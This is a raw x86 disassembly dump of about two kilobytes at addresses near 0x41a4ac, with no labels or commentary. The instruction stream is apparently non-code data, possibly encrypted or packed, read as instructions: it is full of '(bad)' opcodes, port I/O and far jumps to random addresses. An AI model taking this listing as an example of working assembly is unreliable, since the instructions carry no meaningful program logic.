  41a4ac:	stos   BYTE PTR es:[edi],al
  41a4ad:	jns    0x41a522
  41a4af:	xchg   ecx,eax
  41a4b0:	repz dec eax
  41a4b2:	mov    eax,0xebca3b8b
  41a4b7:	pop    edx
  41a4b8:	stos   DWORD PTR es:[edi],eax
  41a4b9:	sbb    ecx,eax
  41a4bb:	mov    esi,0x74f1f872
  41a4c0:	pop    eax
  41a4c1:	push   0x5a3b298e
  41a4c6:	xchg   ebx,eax
  41a4c7:	sub    cl,BYTE PTR [ebp+ebp*1+0x489e9624]
  41a4ce:	xchg   esp,eax
  41a4cf:	xchg   edi,eax
  41a4d0:	leave  
  41a4d1:	mov    esi,0xbae1681
  41a4d6:	inc    edx
  41a4d7:	fwait
  41a4d8:	adc    al,ch
  41a4da:	cmp    dh,BYTE PTR [edx-0x42]
  41a4dd:	in     eax,dx
  41a4de:	jnp    0x41a47d
  41a4e0:	in     al,dx
  41a4e1:	ret    0x78ea
  41a4e4:	jbe    0x41a487
  41a4e6:	cmp    eax,0x227f6c19
  41a4eb:	ficom  WORD PTR [edi+esi*8+0x623bbedc]
  41a4f2:	pop    esi
  41a4f3:	cmp    al,0x9b
  41a4f5:	xor    DWORD PTR [esi-0x578a8a24],0xa00591f6
  41a4ff:	jg     0x41a4dd
  41a501:	repz xchg esp,eax
  41a503:	cmc    
  41a504:	mov    esp,0xc0f8fb5b
  41a509:	jo     0x41a53c
  41a50b:	call   0x8463d003
  41a510:	mov    ebp,0x99873117
  41a515:	pop    esp
  41a516:	test   ecx,ecx
  41a518:	nop
  41a519:	into   
  41a51a:	es jmp 0x41a559
  41a51d:	ror    DWORD PTR [ecx+0x4a],0xd4
  41a521:	cmp    al,0x11
  41a523:	inc    ecx
  41a524:	(bad)  
  41a525:	push   ebp
  41a526:	lea    esi,[esi]
  41a528:	mov    al,0x36
  41a52a:	fs mov edx,ecx
  41a52d:	call   0xd902:0x10f29ded
  41a534:	sbb    BYTE PTR [ebx+0x64f5bd60],bl
  41a53a:	aas    
  41a53b:	in     al,dx
  41a53c:	dec    esp
  41a53d:	aam    0x1b
  41a53f:	in     al,0xc0
  41a541:	sub    dh,BYTE PTR [edx+0x79]
  41a544:	inc    eax
  41a545:	adc    DWORD PTR [ebp-0x7e77c870],edi
  41a54b:	adc    ch,dh
  41a54d:	add    ebx,ebx
  41a54f:	lock xor DWORD PTR [ecx],ebp
  41a552:	int3   
  41a553:	jns    0x41a58c
  41a555:	icebp  
  41a556:	xor    al,0x68
  41a558:	sahf   
  41a559:	lods   al,BYTE PTR ds:[esi]
  41a55a:	sbb    eax,ecx
  41a55c:	fsubr  DWORD PTR [edi-0x3eff763]
  41a562:	inc    ebx
  41a563:	mov    BYTE PTR [ecx],bl
  41a565:	jb     0x41a5cd
  41a567:	jecxz  0x41a550
  41a569:	mov    BYTE PTR [esi-0x4],cl
  41a56c:	fucomip st,st(4)
  41a56e:	into   
  41a56f:	inc    ecx
  41a570:	scas   eax,DWORD PTR es:[edi]
  41a571:	loop   0x41a50a
  41a573:	cmp    BYTE PTR [ebp+edx*4+0x4b],ch
  41a577:	jae    0x41a5a1
  41a579:	xor    eax,0x1aa9dc6e
  41a57e:	xor    BYTE PTR [eax],bh
  41a580:	ins    BYTE PTR es:[edi],dx
  41a581:	inc    eax
  41a582:	(bad)  
  41a584:	stos   DWORD PTR es:[edi],eax
  41a585:	ror    DWORD PTR [edi],0x24
  41a588:	jo     0x41a553
  41a58a:	mov    dh,BYTE PTR [esp+eiz*4-0x6a7a730b]
  41a591:	cli    
  41a592:	out    0x2c,al
  41a594:	xlat   BYTE PTR ds:[ebx]
  41a595:	inc    ecx
  41a596:	pop    esi
  41a597:	pop    edx
  41a598:	fstp   DWORD PTR [esp+eiz*8-0x2ccf880e]
  41a59f:	inc    ebx
  41a5a0:	das    
  41a5a1:	xor    BYTE PTR [esi+0x469fe4a],bh
  41a5a7:	repnz or edx,esi
  41a5aa:	mov    cl,0xdd
  41a5ac:	jne    0x41a55f
  41a5ae:	push   edi
  41a5af:	mov    al,0xf7
  41a5b1:	cs ret 0x277a
  41a5b5:	inc    edx
  41a5b6:	mov    ?,WORD PTR [edi+0x4e]
  41a5b9:	cli    
  41a5ba:	jmp    FWORD PTR [ebp-0x7762b27d]
  41a5c0:	or     DWORD PTR fs:[ebx+0x2460a1bd],edi
  41a5c7:	jmp    0x6cba:0x2d81c90d
  41a5ce:	(bad)  
  41a5cf:	(bad)  
  41a5d0:	cmp    ch,BYTE PTR [esi-0x3]
  41a5d3:	or     al,0x32
  41a5d5:	nop    DWORD PTR [ecx+0x61]
  41a5d9:	aas    
  41a5da:	aad    0x43
  41a5dc:	hlt    
  41a5dd:	cmc    
  41a5de:	and    al,0x6c
  41a5e0:	dec    esi
  41a5e1:	adc    ebp,DWORD PTR [esi+0x3a]
  41a5e4:	adc    DWORD PTR [edx],ebp
  41a5e6:	lahf   
  41a5e7:	into   
  41a5e8:	lahf   
  41a5e9:	shl    dl,1
  41a5eb:	retf   
  41a5ec:	mov    bh,0xf
  41a5ee:	and    ah,BYTE PTR ds:0xc1051c34
  41a5f4:	mov    edi,eax
  41a5f6:	jp     0x41a5e2
  41a5f8:	and    al,0xad
  41a5fa:	shr    DWORD PTR [edi-0x6c43783e],1
  41a600:	push   edx
  41a601:	xor    eax,0xaf5b3f34
  41a606:	xor    dh,BYTE PTR [edi+0x1c]
  41a609:	push   0x68dcb8d4
  41a60e:	into   
  41a60f:	push   cs
  41a610:	idiv   ah
  41a612:	dec    ecx
  41a613:	inc    edx
  41a614:	sbb    BYTE PTR [ecx],dl
  41a616:	cmp    edx,DWORD PTR [ecx+0x59]
  41a619:	inc    eax
  41a61a:	pop    ebp
  41a61b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a61c:	mov    eax,ds:0xf9d6a419
  41a621:	addr16 adc eax,0x9061b3
  41a627:	out    0x40,eax
  41a629:	sbb    ecx,DWORD PTR [eax-0x483a7bcb]
  41a62f:	xchg   edx,eax
  41a630:	(bad)
  41a633:	push   cs
  41a634:	pusha  
  41a635:	dec    ebp
  41a636:	hlt    
  41a637:	jecxz  0x41a66e
  41a639:	pusha  
  41a63a:	inc    esp
  41a63b:	retf   0xa481
  41a63e:	ror    BYTE PTR [edx],0x52
  41a641:	and    BYTE PTR [edx-0x70528463],dl
  41a647:	xor    esi,DWORD PTR [ebx-0x45b6f056]
  41a64d:	repnz (bad) 
  41a650:	cs or  eax,0x8718bf99
  41a656:	cwde   
  41a657:	xlat   BYTE PTR ds:[ebx]
  41a658:	cli    
  41a659:	pop    ebx
  41a65a:	pop    ds
  41a65b:	dec    esi
  41a65c:	sbb    DWORD PTR [ebx+0x3a],esi
  41a65f:	stos   DWORD PTR es:[edi],eax
  41a660:	nop
  41a661:	cmp    cl,bl
  41a663:	leave  
  41a664:	ret    
  41a665:	inc    edi
  41a666:	push   es
  41a667:	inc    esi
  41a668:	cmp    BYTE PTR [edi+0x37],al
  41a66b:	xchg   ebp,eax
  41a66c:	mov    cl,0x83
  41a66e:	fmul   DWORD PTR [eax+ecx*4-0x2a35c427]
  41a675:	push   eax
  41a676:	retf   
  41a677:	add    al,0x1
  41a679:	outs   dx,BYTE PTR ds:[esi]
  41a67a:	call   0x1f6a:0x18b02501
  41a681:	or     ah,ch
  41a683:	loope  0x41a6d6
  41a685:	iret   
  41a686:	push   DWORD PTR [ecx-0x74380cca]
  41a68c:	mov    ecx,edx
  41a68e:	xchg   ebx,eax
  41a68f:	sub    eax,0x34fe6aa8
  41a694:	cli    
  41a695:	jne    0x41a694
  41a697:	das    
  41a698:	icebp  
  41a699:	mov    esp,0x73025ae8
  41a69e:	(bad)  
  41a69f:	nop
  41a6a0:	out    0x46,eax
  41a6a2:	es lahf 
  41a6a4:	loope  0x41a702
  41a6a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6a7:	in     al,0x8e
  41a6a9:	js     0x41a701
  41a6ab:	mov    cl,0xe8
  41a6ad:	std    
  41a6ae:	or     al,0x17
  41a6b0:	and    BYTE PTR [esi],cl
  41a6b2:	add    esp,DWORD PTR [esi+0x17]
  41a6b5:	test   BYTE PTR [ebp-0x69a9b8a5],0xf6
  41a6bc:	lods   eax,DWORD PTR ds:[esi]
  41a6bd:	sub    eax,0x93c3f93c
  41a6c2:	pop    ds
  41a6c3:	rcr    DWORD PTR [ebx+edx*1+0x2b],cl
  41a6c7:	xchg   esp,eax
  41a6c8:	and    eax,0xb17ea502
  41a6cd:	test   al,0xee
  41a6cf:	in     al,dx
  41a6d0:	mov    WORD PTR [esi],?
  41a6d2:	or     BYTE PTR [ebx],cl
  41a6d4:	sahf   
  41a6d5:	shr    DWORD PTR [edi+0x251f4dda],1
  41a6db:	add    bl,BYTE PTR [edi+edx*1]
  41a6de:	imul   ecx,DWORD PTR [edi-0x5f],0xffffffc4
  41a6e2:	sahf   
  41a6e3:	mov    eax,ds:0x6ffbe1ed
  41a6e8:	cmp    ecx,esp
  41a6ea:	ret    0xf579
  41a6ed:	in     al,dx
  41a6ee:	mov    ecx,0x947257a
  41a6f3:	fiadd  DWORD PTR [eax]
  41a6f5:	in     al,dx
  41a6f6:	arpl   dx,si
  41a6f8:	loop   0x41a6c9
  41a6fa:	(bad)  
  41a6fb:	pop    ebp
  41a6fc:	pop    esi
  41a6fd:	jp     0x41a76b
  41a6ff:	sbb    ch,BYTE PTR [eax+0x65664806]
  41a705:	push   eax
  41a706:	(bad)  
  41a707:	push   ecx
  41a708:	std    
  41a709:	daa    
  41a70a:	jmp    0x41a757
  41a70c:	sub    edx,DWORD PTR [eax]
  41a70e:	in     eax,0x32
  41a710:	leave  
  41a711:	enter  0x1d88,0x9f
  41a715:	test   DWORD PTR [ebp-0x54d44023],eax
  41a71b:	scas   eax,DWORD PTR es:[edi]
  41a71c:	cli    
  41a71d:	pushf  
  41a71e:	enter  0x8295,0x52
  41a722:	mov    bl,bh
  41a724:	mov    eax,0x8477b835
  41a729:	mov    al,0xc9
  41a72b:	into   
  41a72c:	bound  ebx,QWORD PTR [edi-0xbf18116]
  41a732:	xchg   edx,eax
  41a733:	aad    0x72
  41a735:	mov    edx,0x86fceea7
  41a73a:	outs   dx,BYTE PTR ds:[esi]
  41a73c:	ins    BYTE PTR es:[edi],dx
  41a73d:	jno    0x41a6ea
  41a73f:	aad    0xc4
  41a741:	or     cl,BYTE PTR [edx]
  41a743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a744:	lock mov eax,ds:0x7f46aaf9
  41a74a:	fwait
  41a74b:	inc    ebp
  41a74c:	(bad)  
  41a74e:	or     al,0x7
  41a750:	push   ebx
  41a751:	inc    ebp
  41a752:	lds    esp,FWORD PTR [edx]
  41a754:	jns    0x41a745
  41a756:	xor    bh,ah
  41a758:	aam    0x59
  41a75a:	pop    ds
  41a75b:	stc    
  41a75c:	sbb    esi,DWORD PTR [edx+ecx*2-0x1d5159b1]
  41a763:	adc    bh,bh
  41a765:	jne    0x41a7a1
  41a767:	jle    0x41a6f6
  41a769:	mov    al,ds:0x346862a
  41a76e:	mov    esi,ds
  41a770:	jle    0x41a7ad
  41a772:	push   ebp
  41a773:	out    dx,eax
  41a774:	xchg   esp,eax
  41a775:	into   
  41a776:	jne    0x41a757
  41a778:	add    ebp,DWORD PTR [ecx]
  41a77a:	and    ebx,DWORD PTR [eax+edx*1]
  41a77d:	popa   
  41a77e:	icebp  
  41a77f:	in     eax,0xa5
  41a781:	bound  ebp,QWORD PTR [edx-0xbc4e470]
  41a787:	push   esp
  41a788:	mov    esp,0x2fff476f
  41a78d:	adc    al,0x12
  41a78f:	xor    bl,BYTE PTR [esi-0x1f]
  41a792:	std    
  41a793:	sub    al,0x17
  41a795:	xor    ah,ch
  41a797:	aam    0xbc
  41a799:	add    eax,0x2443a0d
  41a79e:	out    dx,eax
  41a79f:	bound  ebx,QWORD PTR [ecx+0x3a]
  41a7a2:	sub    ebx,ecx
  41a7a4:	(bad)  [eax-0x79632e0e]
  41a7aa:	and    DWORD PTR [edi-0x42fe3553],esi
  41a7b0:	sbb    bh,bh
  41a7b2:	xchg   ebx,eax
  41a7b3:	das    
  41a7b4:	add    al,0xfe
  41a7b6:	in     eax,0xed
  41a7b8:	cmp    dl,BYTE PTR [ecx]
  41a7ba:	cmp    BYTE PTR [edx],0xe9
  41a7bd:	jmp    0xf53e0fd8
  41a7c2:	(bad)  
  41a7c4:	(bad)  
  41a7c5:	pop    eax
  41a7c6:	fs adc eax,0xdab33f59
  41a7cc:	int3   
  41a7cd:	aaa    
  41a7ce:	jbe    0x41a839
  41a7d0:	pop    eax
  41a7d1:	jg     0x41a7f5
  41a7d3:	dec    esi
  41a7d4:	scas   al,BYTE PTR es:[edi]
  41a7d5:	mov    bl,al
  41a7d7:	push   ss
  41a7d8:	(bad)  
  41a7d9:	and    BYTE PTR [ebx],bl
  41a7db:	js     0x41a82d
  41a7dd:	fs mov al,0x96
  41a7e0:	les    esp,FWORD PTR [edx]
  41a7e2:	cmp    BYTE PTR [ebx+0x52],dh
  41a7e5:	in     eax,dx
  41a7e6:	sub    esi,ecx
  41a7e8:	fnstenv [ebx-0xa]
  41a7eb:	xchg   ebp,eax
  41a7ec:	in     eax,dx
  41a7ed:	push   cs
  41a7ee:	xlat   BYTE PTR ds:[ebx]
  41a7ef:	shl    DWORD PTR [edx-0xb],1
  41a7f2:	cs inc esi
  41a7f4:	dec    esi
  41a7f5:	lahf   
  41a7f6:	test   eax,0x10eba5ae
  41a7fb:	sub    DWORD PTR ds:0xf8b6dbb5,ecx
  41a801:	adc    DWORD PTR [ebx],edi
  41a803:	xor    esp,ecx
  41a805:	call   0x1f1:0x98a85359
  41a80c:	mov    ch,0xf2
  41a80e:	sub    DWORD PTR [eax],esi
  41a810:	rcr    DWORD PTR [eax+0x46ac1c22],1
  41a816:	stc    
  41a817:	mov    BYTE PTR [eax-0x5563f4f3],0x47
  41a81e:	push   ecx
  41a81f:	pop    esp
  41a820:	rol    BYTE PTR [edx+ecx*4-0x5ce70ebf],cl
  41a827:	add    BYTE PTR [edi+eiz*2+0x7cfd24f7],0x37
  41a82f:	xor    DWORD PTR [ecx-0x1fdb7ed4],esp
  41a835:	and    DWORD PTR [ecx+0x22593e3c],0x7f
  41a83c:	shl    DWORD PTR [esi+0xcfd1244],cl
  41a842:	adc    cl,al
  41a844:	pop    esp
  41a845:	inc    eax
  41a846:	xchg   esi,eax
  41a847:	adc    esp,DWORD PTR fs:[eax+0xbbe22b3]
  41a84e:	inc    edi
  41a84f:	jno    0x41a81d
  41a851:	imul   eax,DWORD PTR [ebx-0x3b],0x21dfdf78
  41a858:	jle    0x41a8bf
  41a85a:	fst    DWORD PTR [ebx+0xb8c0d61]
  41a860:	rcr    BYTE PTR [ecx],cl
  41a862:	js     0x41a872
  41a864:	mov    al,dh
  41a866:	sbb    dl,bh
  41a868:	push   eax
  41a869:	mov    edi,esp
  41a86b:	fdiv   DWORD PTR ds:0x3fdb0daa
  41a871:	sbb    eax,0xc37f5234
  41a876:	sub    ebp,DWORD PTR [ecx]
  41a878:	lods   eax,DWORD PTR ds:[esi]
  41a879:	not    BYTE PTR [ecx+0x17720d23]
  41a87f:	mov    BYTE PTR [edi],bl
  41a881:	ror    BYTE PTR [ecx],1
  41a883:	sbb    DWORD PTR ds:0x98a18ff4,esi
  41a889:	jb     0x41a8b0
  41a88b:	sahf   
  41a88c:	cmp    BYTE PTR [ebx],ah
  41a88e:	fdivr  QWORD PTR [ecx+0x6]
  41a891:	test   al,0x6
  41a893:	or     bl,BYTE PTR [eax-0x551c8522]
  41a899:	test   eax,0x321a7b81
  41a89e:	or     DWORD PTR [edx-0x399516a0],ebx
  41a8a4:	inc    eax
  41a8a5:	loop   0x41a8d1
  41a8a7:	aas    
  41a8a8:	and    dh,BYTE PTR [edi+0x11]
  41a8ab:	push   ebx
  41a8ac:	rcr    DWORD PTR [ebp+0x6f4f16aa],1
  41a8b2:	mov    dh,0xb8
  41a8b4:	out    0x94,al
  41a8b6:	pusha  
  41a8b7:	xlat   BYTE PTR ds:[bx]
  41a8b9:	or     DWORD PTR [ebx],esp
  41a8bb:	mov    bh,0xe2
  41a8bd:	mov    ah,0x6d
  41a8bf:	adc    al,0xea
  41a8c1:	in     al,dx
  41a8c2:	push   esi
  41a8c3:	pop    ecx
  41a8c4:	cwde   
  41a8c5:	push   ecx
  41a8c6:	fld    QWORD PTR [ebp-0xaf5d1b1]
  41a8cc:	mov    ch,0x83
  41a8ce:	cwde   
  41a8cf:	jge    0x41a8e2
  41a8d1:	push   esp
  41a8d2:	fidivr DWORD PTR cs:[esi+0xbb708c2]
  41a8d9:	adc    bl,dl
  41a8db:	cmp    al,0xe2
  41a8dd:	or     DWORD PTR [esi],ebx
  41a8df:	jg     0x41a889
  41a8e1:	test   eax,0x485dd00d
  41a8e6:	arpl   WORD PTR [ebp+0x3d77f70c],cx
  41a8ec:	clc    
  41a8ed:	repz call DWORD PTR [esi-0x3d]
  41a8f1:	ffreep st(4)
  41a8f3:	cwde   
  41a8f4:	shl    BYTE PTR [ecx+0x6c928cc],1
  41a8fa:	fild   DWORD PTR [eax+0x6372f07b]
  41a900:	mul    bl
  41a902:	and    eax,0x5397eed1
  41a907:	call   0xe6fa995f
  41a90c:	xchg   esi,eax
  41a90d:	dec    edx
  41a90e:	ss scas eax,DWORD PTR es:[edi]
  41a910:	(bad)  
  41a911:	pop    ds
  41a912:	dec    edx
  41a913:	push   edx
  41a914:	mov    bl,0xf4
  41a916:	or     eax,0xad1c4e4e
  41a91b:	or     al,0xc6
  41a91d:	ds and esi,edi
  41a920:	fadd   QWORD PTR [eax]
  41a922:	sbb    al,0xfc
  41a924:	std    
  41a925:	pop    ds
  41a926:	inc    ebx
  41a927:	pop    esi
  41a928:	popa   
  41a929:	push   ebp
  41a92a:	cmpxchg DWORD PTR [ecx+0x71],edi
  41a92e:	(bad)  
  41a92f:	fild   WORD PTR [edi+eax*2-0x3620214c]
  41a936:	adc    BYTE PTR [eax+eax*2+0x53],0xea
  41a93b:	xor    bl,ch
  41a93d:	out    dx,eax
  41a93e:	cmp    BYTE PTR [edi],bl
  41a940:	hlt    
  41a941:	jmp    0x551a:0xf67e8351
  41a948:	les    ecx,FWORD PTR [edi-0x7]
  41a94b:	(bad)  
  41a94d:	adc    edx,DWORD PTR [ebx+0x56]
  41a950:	inc    esi
  41a951:	mov    ecx,0xea3dae7f
  41a956:	jb     0x41a961
  41a958:	nop
  41a959:	jnp    0x41a9a3
  41a95b:	(bad)  
  41a95c:	daa    
  41a95d:	mov    esp,0xe28d9332
  41a962:	xchg   edx,eax
  41a963:	out    0x2,eax
  41a965:	retf   0xa43c
  41a968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a969:	pop    eax
  41a96a:	fdiv   DWORD PTR [ebx]
  41a96c:	(bad)
  41a96f:	add    al,0x4a
  41a971:	sub    BYTE PTR [ebx],ch
  41a973:	jmp    0x41a97d
  41a975:	ins    DWORD PTR es:[edi],dx
  41a976:	pop    es
  41a977:	loop   0x41a961
  41a979:	jnp    0x41a915
  41a97b:	xor    bh,BYTE PTR [ebp+0x36]
  41a97e:	jb     0x41a917
  41a980:	(bad)  [ebp-0x57d8c837]
  41a986:	(bad)  
  41a988:	push   esp
  41a989:	xchg   esi,eax
  41a98a:	cmp    eax,0xdaef73aa
  41a98f:	sbb    DWORD PTR [ebx+0x4ae78611],edx
  41a995:	add    edx,edx
  41a997:	xchg   ebp,eax
  41a998:	jp     0x41a986
  41a99a:	push   edx
  41a99b:	push   esi
  41a99c:	les    edi,FWORD PTR [ebx-0x625a078b]
  41a9a2:	cmp    eax,0x54baaf9
  41a9a7:	mov    si,0xd0cc
  41a9ab:	stos   BYTE PTR es:[edi],al
  41a9ac:	cmp    DWORD PTR [esi-0x4b936a2a],edi
  41a9b2:	lods   al,BYTE PTR ds:[esi]
  41a9b3:	sti    
  41a9b4:	xchg   bl,ah
  41a9b6:	mov    ebx,0x83f93102
  41a9bb:	rcl    BYTE PTR [ecx+0x4c],0x43
  41a9bf:	push   ebx
  41a9c0:	das    
  41a9c1:	into   
  41a9c2:	sbb    eax,0x3dfbfd65
  41a9c7:	shl    BYTE PTR [edi+eiz*4+0x4c],0xec
  41a9cc:	xchg   DWORD PTR [ebx],ebp
  41a9ce:	mov    ecx,0x97b0918e
  41a9d3:	add    eax,0x983920e1
  41a9d8:	jb     0x41a9b7
  41a9da:	xchg   edi,eax
  41a9db:	mov    esi,0x34f0694f
  41a9e0:	cs mov ecx,0x37c0302
  41a9e6:	je     0x41aa01
  41a9e8:	aam    0x5f
  41a9ea:	push   ebp
  41a9eb:	sub    ebp,DWORD PTR [edx+edx*2+0x32]
  41a9ef:	fstp   DWORD PTR [ebx+eax*8+0x7201e8b0]
  41a9f6:	das    
  41a9f7:	fwait
  41a9f8:	mov    bl,0x6c
  41a9fa:	pusha  
  41a9fb:	dec    esp
  41a9fc:	jnp    0x41aa57
  41a9fe:	cmp    ebx,DWORD PTR [ebp-0x428b4e72]
  41aa04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa05:	jnp    0x41a99a
  41aa07:	imul   ecx,ebp,0xffffffcc
  41aa0a:	out    0xdf,al
  41aa0c:	xor    eax,0xcca19e05
  41aa11:	or     bl,dh
  41aa13:	xchg   edi,eax
  41aa14:	push   edx
  41aa15:	stos   BYTE PTR es:[edi],al
  41aa16:	and    edx,DWORD PTR [ebx]
  41aa18:	les    ebp,FWORD PTR [eax+0x2a532596]
  41aa1e:	(bad)  
  41aa20:	push   cs
  41aa21:	add    eax,0xb62983fe
  41aa26:	push   0x31
  41aa28:	sub    edx,eax
  41aa2a:	je     0x41aa3b
  41aa2c:	push   eax
  41aa2d:	pop    ecx
  41aa2e:	xchg   DWORD PTR [ecx],ebx
  41aa30:	inc    ecx
  41aa31:	push   esp
  41aa32:	or     DWORD PTR [ecx],ecx
  41aa34:	add    eax,0x5a1c678e
  41aa39:	repz or dl,BYTE PTR [ecx+0x6d]
  41aa3d:	xchg   esp,eax
  41aa3e:	xor    esi,DWORD PTR [ecx]
  41aa40:	les    ebx,FWORD PTR [esi+0x4107d5e6]
  41aa46:	cdq    
  41aa47:	les    ecx,FWORD PTR [edx-0x53483010]
  41aa4d:	(bad)  
  41aa4e:	js     0x41aa31
  41aa50:	dec    ebp
  41aa51:	add    DWORD PTR [edx-0x7d911c82],eax
  41aa57:	xor    ebx,DWORD PTR [edx+0x38]
  41aa5a:	(bad)  
  41aa5b:	cmp    bl,ah
  41aa5d:	(bad)  
  41aa5e:	and    al,0x58
  41aa60:	sbb    bl,BYTE PTR [esi+0x7e0bc953]
  41aa66:	ja     0x41aa1f
  41aa68:	jo     0x41aae6
  41aa6a:	loope  0x41aab4
  41aa6c:	sar    DWORD PTR [ebx-0x692f113e],0x7f
  41aa73:	(bad)  
  41aa74:	gs dec ebp
  41aa76:	xchg   edi,eax
  41aa77:	std    
  41aa78:	push   ebp
  41aa79:	and    al,0xe1
  41aa7b:	and    al,0xcf
  41aa7d:	inc    esp
  41aa7e:	adc    DWORD PTR [esi+0x57],esi
  41aa81:	push   esp
  41aa82:	mov    edi,0xd4d07680
  41aa87:	pop    ebx
  41aa88:	loopne 0x41aa61
  41aa8a:	push   ds
  41aa8b:	push   esp
  41aa8c:	imul   ebp,DWORD PTR [ecx],0xffffffd0
  41aa8f:	inc    eax
  41aa90:	push   esi
  41aa91:	loope  0x41aa94
  41aa93:	pop    ss
  41aa94:	ror    BYTE PTR [eax+0x68],cl
  41aa97:	mov    ebp,0x99ceb778
  41aa9c:	mov    dh,BYTE PTR [esi+edi*2+0x7b1cfe72]
  41aaa3:	inc    edi
  41aaa4:	out    0xed,al
  41aaa6:	test   DWORD PTR ds:0x538611cc,ecx
  41aaac:	pop    ecx
  41aaad:	scas   eax,DWORD PTR es:[edi]
  41aaae:	loopne 0x41ab00
  41aab0:	test   BYTE PTR [ecx+0x6],bl
  41aab3:	call   0x7b84:0xe3bd64bb
  41aaba:	jmp    DWORD PTR [ecx-0x3b90dd8b]
  41aac0:	mov    dh,0xc2
  41aac2:	popa   
  41aac3:	pushf  
  41aac4:	dec    esi
  41aac5:	xor    dl,dl
  41aac7:	cmp    BYTE PTR [edx],ah
  41aac9:	mov    edx,DWORD PTR [ebp+eiz*8-0xe]
  41aacd:	dec    esi
  41aace:	aas    
  41aacf:	out    dx,al
  41aad0:	sbb    ecx,esi
  41aad2:	mov    esp,0xb19906b9
  41aad7:	jo     0x551c47f
  41aadd:	enter  0xc544,0x2f
  41aae1:	push   ds
  41aae2:	add    al,BYTE PTR [ebp+0x3041ead3]
  41aae8:	stos   BYTE PTR es:[edi],al
  41aae9:	mov    BYTE PTR [ebx-0x5ae7f526],ch
  41aaef:	cld    
  41aaf0:	mov    bl,BYTE PTR [ecx-0x52eaa300]
  41aaf6:	sbb    al,0x25
  41aaf8:	mov    al,BYTE PTR [ebx-0x4a]
  41aafb:	aam    0xb0
  41aafd:	out    dx,eax
  41aafe:	pop    eax
  41aaff:	jmp    0xdb4d9833
  41ab04:	xor    ecx,DWORD PTR [esp+ecx*8-0xcc61d41]
  41ab0b:	rol    BYTE PTR [ebx],0xe
  41ab0e:	pop    edx
  41ab0f:	or     BYTE PTR [ebp-0x36],bh
  41ab12:	xchg   BYTE PTR [ecx-0x25],ah
  41ab15:	lds    ebx,FWORD PTR [ebx+eax*4]
  41ab18:	and    al,BYTE PTR [edx]
  41ab1a:	stos   DWORD PTR es:[edi],eax
  41ab1b:	xchg   ebx,eax
  41ab1c:	out    0x9c,al
  41ab1e:	out    0x44,al
  41ab20:	lahf   
  41ab21:	pop    es
  41ab22:	sbb    bh,al
  41ab24:	xchg   ebx,eax
  41ab25:	pop    ebx
  41ab26:	add    cl,BYTE PTR [edx+0x79d9235c]
  41ab2c:	mov    al,ds:0x111cde10
  41ab31:	(bad)  
  41ab33:	sahf   
  41ab34:	(bad)  
  41ab36:	lahf   
  41ab37:	mov    esp,DWORD PTR [ebx]
  41ab39:	imul   esp,eax,0xc2eeba86
  41ab3f:	sbb    dl,cl
  41ab41:	and    eax,0xf9de7bc3
  41ab46:	sbb    DWORD PTR [ebx],esp
  41ab48:	mov    eax,0x2cb0b9af
  41ab4d:	dec    edx
  41ab4e:	xor    eax,0xa9cf130e
  41ab53:	pop    ecx
  41ab54:	loopne 0x41ab1b
  41ab56:	sub    DWORD PTR [edx],ebx
  41ab58:	mov    BYTE PTR cs:[eax],bl
  41ab5b:	pop    es
  41ab5c:	cli    
  41ab5d:	out    dx,al
  41ab5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab5f:	pop    ebp
  41ab60:	fld    TBYTE PTR [ebp+0x1a9669b]
  41ab66:	or     DWORD PTR [eax+0x4f3f131e],ebx
  41ab6c:	sbb    bh,BYTE PTR [edi-0x12833437]
  41ab72:	and    bh,BYTE PTR [edi+ebp*2]
  41ab75:	lods   eax,DWORD PTR ds:[esi]
  41ab76:	loopne 0x41abc9
  41ab78:	cmp    al,ah
  41ab7a:	jno    0x41abd5
  41ab7c:	dec    ebx
  41ab7d:	push   0x27
  41ab7f:	jmp    0x41ab6c
  41ab81:	leave  
  41ab82:	cdq    
  41ab83:	mov    ds:0x88afcd2b,eax
  41ab88:	pusha  
  41ab89:	jmp    0x629:0xb6aa0655
  41ab90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab91:	mov    edx,0x93a049d
  41ab96:	and    edx,ecx
  41ab98:	or     eax,0x4ef1ab0a
  41ab9d:	mov    edx,esi
  41ab9f:	mov    eax,ds:0xdcc88d48
  41aba4:	sbb    DWORD PTR [edi],edx
  41aba6:	pop    edx
  41aba7:	inc    edi
  41aba8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aba9:	sub    cl,dl
  41abab:	cmp    DWORD PTR [esi+0x19],ebx
  41abae:	push   edx
  41abaf:	dec    edx
  41abb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abb1:	aas    
  41abb2:	(bad)  
  41abb4:	xchg   ebx,eax
  41abb5:	or     eax,0xc60d2d5a
  41abba:	rcr    BYTE PTR [ebx-0x3e],1
  41abbd:	fs sahf 
  41abbf:	push   ebp
  41abc0:	sbb    esp,eax
  41abc2:	xchg   ax,ax
  41abc4:	addr16 pushf 
  41abc6:	mov    dl,BYTE PTR [edx-0x3c28a0e4]
  41abcc:	xor    bh,BYTE PTR ss:[esi+ebp*1]
  41abd0:	xor    BYTE PTR [edx+0x772bc4d6],cl
  41abd6:	test   DWORD PTR [edx+0x19],edi
  41abd9:	mov    ecx,DWORD PTR [ecx]
  41abdb:	lahf   
  41abdc:	pop    ecx
  41abdd:	scas   al,BYTE PTR es:[edi]
  41abde:	or     BYTE PTR [esi+0x6a],ah
  41abe1:	loope  0x41abaa
  41abe3:	mov    cl,0x69
  41abe5:	dec    ecx
  41abe6:	cli    
  41abe7:	rcl    BYTE PTR [eax-0x3],0x1c
  41abeb:	imul   edx,ebx,0x32
  41abee:	and    edi,DWORD PTR [ecx]
  41abf0:	je     0x41ac3f
  41abf2:	cmp    DWORD PTR [esi],ebx
  41abf4:	push   ebp
  41abf5:	cmp    dl,ah
  41abf7:	es idiv bh
  41abfa:	mov    ds:0x5519bd17,al
  41abff:	rol    cl,cl
  41ac01:	xlat   BYTE PTR ds:[ebx]
  41ac02:	cmp    ah,BYTE PTR [esi+0x30]
  41ac05:	adc    edx,DWORD PTR [ecx+0x56f833ee]
  41ac0b:	dec    esp
  41ac0c:	pop    ebp
  41ac0d:	stos   DWORD PTR es:[edi],eax
